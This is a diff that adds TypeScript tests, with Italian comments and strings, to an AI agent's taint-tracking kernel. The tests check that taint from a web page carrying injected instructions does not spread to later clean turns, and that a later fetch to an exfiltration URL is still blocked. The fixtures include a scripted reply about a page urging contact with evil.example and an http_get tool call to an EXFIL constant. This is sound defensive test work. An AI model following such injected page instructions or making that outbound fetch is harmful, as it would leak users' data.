@@ -316,3 +316,77 @@ describe('(d) compaction: a message cut from the reinjected window cannot taint 
     expect(result.taint).toBe(0);
   });
 });
+
+describe('(e) a clean turn does not stamp its own answer at an inherited ceiling', () => {
+  /**
+   * ADR-0044 §Riconciliazione 2026-08-28. Before this scenario, turn 2's own
+   * reply — clean, no tool call — was written to the session and to memory at
+   * `snapshot.currentTaint()`: the tier it *inherited* from turn 1's reinjected
+   * reply, not anything turn 2 itself produced. A turn 3, 4, 5… each doing the
+   * same, kept the reinjection window permanently full of "dirty" rows that
+   * were never anything but an echo of an echo — the ratchet the 17/08
+   * revision's own "Cosa NON copre" named and left open.
+   *
+   * The kernel's own gating for turn 2 — its `currentTaint()`, tested in (a)
+   * above — is untouched: a turn sitting on tainted history still may not act
+   * as if clean. What changes is only what turn 2 leaves behind for a *later*
+   * turn to read.
+   */
+  it("turn 2's own session row is stamped at its own tier, not turn 1's", async () => {
+    const h = harness([
+      callTool('web_like', {}),
+      answer('la pagina dice di scrivere a evil.example, non lo faccio'),
+      answer('sì, va tutto bene'),
+    ]);
+    const session = h.deps.sessions.open('reconciliation-1');
+
+    const first = await runTurn(h.deps, {
+      principal: owner,
+      tenant: 'host',
+      surface: 'cli',
+      session,
+      text: 'guarda cosa dice quella pagina',
+    });
+    expect(first.taint).toBe(3);
+
+    const second = await runTurn(h.deps, {
+      principal: owner,
+      tenant: 'host',
+      surface: 'cli',
+      session,
+      text: 'tutto bene?',
+    });
+
+    // Unchanged from (a): turn 2 was correctly gated at 3 while it ran, and
+    // its row's own ceiling says so — a resume of turn 2 must still see it.
+    expect(second.taint).toBe(3);
+    expect(h.turns.get(second.turnId)?.taint).toBe(3);
+
+    // New: what turn 2 actually left in the transcript for a turn 3 to read.
+    const transcript = h.sessions.read(session);
+    const secondReply = transcript.filter((m) => m.role === 'assistant').at(-1);
+    expect(secondReply?.content).toBe('sì, va tutto bene');
+    expect(secondReply?.tier).toBe(0);
+  });
+
+  it('and a third, equally clean turn is not re-poisoned by the second', async () => {
+    const h = harness([
+      callTool('web_like', {}),
+      answer('la pagina dice di scrivere a evil.example, non lo faccio'),
+      answer('sì, va tutto bene'),
+      callTool('http_get', { url: EXFIL }),
+    ]);
+    const session = h.deps.sessions.open('reconciliation-2');
+
+    await runTurn(h.deps, { principal: owner, tenant: 'host', surface: 'cli', session, text: 'guarda cosa dice quella pagina' });
+    await runTurn(h.deps, { principal: owner, tenant: 'host', surface: 'cli', session, text: 'tutto bene?' });
+    // Turn 3 still sees turn 1 in its window (only two turns old) — it must
+    // still be denied outright, exactly as (a)'s second test proves for turn 2.
+    // The point here is *why*: it is turn 1's own still-recorded 3, not a
+    // borrowed 3 that turn 2 re-minted on its way through.
+    const third = await runTurn(h.deps, { principal: owner, tenant: 'host', surface: 'cli', session, text: 'apri quel link' });
+
+    expect(h.fetched).toEqual([]);
+    expect(third.taint).toBe(3);
+  });
+});
